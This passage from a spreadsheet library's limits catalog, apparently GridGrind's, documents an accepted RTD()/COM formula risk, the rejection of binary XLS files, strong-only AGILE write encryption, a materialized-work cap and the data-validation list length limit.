`RTD()` connects to a registered Windows COM automation server when the workbook is opened on
Windows. `FormulaInputSecurity.rejectDde` does not block `RTD()`. The risk is platform-scoped:
`RTD()` is a no-op on macOS and Linux, and on Windows it requires a pre-registered COM server on
the consuming workstation. GridGrind targets server-side xlsx generation workloads where COM
infrastructure is absent. Blocking `RTD()` would require a formula parser; the accepted risk is
Windows-only and depends on attacker-controlled COM registration on the target machine.

## LIM-037 — Workbook Source Content Format

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | Binary XLS content is rejected even when its filename ends in .xlsx |
| Problems | WORKBOOK_NOT_OPENABLE |
| Message template | Only .xlsx workbooks are supported |
| Applies to | source, EXISTING |

The materialized reader constructs XSSFWorkbook rather than the general WorkbookFactory. A native HSSF-written control renamed to .xlsx is rejected, while an OOXML control reopens.

Enforcement: [XssfWorkbooks](../engine/src/main/java/dev/erst/gridgrind/engine/backend/xssf/XssfWorkbooks.java).

## LIM-038 — OOXML Write Encryption Is AGILE-Only And Strong-Only

| Field | Value |
| --- | --- |
| Category | Protocol |
| Limit | Write-side OOXML package encryption authors AGILE only, defaults to `AES_256` / `SHA_512`, and allows only `AES_256` or `AES_192` plus `SHA_512`, `SHA_384`, or `SHA_256` |
| Problems |  |
| Message template |  |
| Applies to | persistence.security.encryption |

GridGrind reads and reports broader factual OOXML encryption state than it authors. Inspection may
surface legacy envelopes such as `STANDARD`, weaker AGILE variants, or non-default hashes because
the goal on the read path is factual reporting. The write path is intentionally narrower:
authorable persistence security owns one explicit strong-only AGILE contract and does not accept a
`mode` field. Existing-workbook writes declare encryption explicitly: `NONE`, `ENCRYPT`, or
`PRESERVE_SOURCE`; omission never inherits source encryption. `PRESERVE_SOURCE` applies only to a
verified source envelope that the strong AGILE write contract can reapply. Reintroduce write-side `STANDARD` only if a named consumer proves an
old-Excel authoring requirement; until then readable/reportable `STANDARD` remains intentionally
broader than the authorable write contract.

Enforcement: [GridGrindOoxmlWriteEncryptionContractText](../core/src/main/java/dev/erst/gridgrind/core/catalog/GridGrindOoxmlWriteEncryptionContractText.java), [OoxmlEncryptionSpec](../core/src/main/java/dev/erst/gridgrind/core/model/security/OoxmlEncryptionSpec.java), [SecurityAdapter](../engine/src/main/java/dev/erst/gridgrind/engine/security/SecurityAdapter.java).

## LIM-039 — Materialized Worksheet Work per Plan

| Field | Value |
| --- | --- |
| Category | GridGrind |
| Limit | 250000 materialized worksheet items per plan |
| Problems | INVALID_REQUEST |
| Message template | `materialized worksheet work must not exceed 250000 items per plan; this step raises the total to {n}` |
| Applies to | APPLY_STYLE, CLEAR_RANGE, SET_ARRAY_FORMULA, SET_RANGE, SET_ROW_HEIGHT, SET_ROW_VISIBILITY, GROUP_ROWS, UNGROUP_ROWS |

GridGrind counts every action that must enumerate cells or create physical rows before the workbook
is opened. The cumulative limit prevents a syntactically valid plan from exhausting the JVM by
materializing an Excel-sized range or row band, including when equivalent work is spread across
several steps.

Enforcement: [WorkbookStaticMaterializationValidation](../core/src/main/java/dev/erst/gridgrind/core/validation/WorkbookStaticMaterializationValidation.java).

## LIM-040 — Explicit Data-Validation List Formula Length

| Field | Value |
| --- | --- |
| Category | Excel / GridGrind |
| Limit | 255 characters in the stored explicit-list formula |
| Problems | INVALID_REQUEST |
| Message template | `values must serialize to at most 255 characters for Excel data validation; got {n}` |
| Applies to | EXPLICIT_LIST |

Excel data-validation explicit lists are stored as one quoted comma-separated formula. GridGrind
rejects commas and quotes inside individual values because that representation cannot preserve them;
use `FORMULA_LIST` when values require delimiters. It validates the complete stored formula before
Apache POI authoring so callers receive the request path and computed length instead of a library
exception.

Enforcement: [DataValidationRuleSpec](../core/src/main/java/dev/erst/gridgrind/core/model/validation/DataValidationRuleSpec.java).
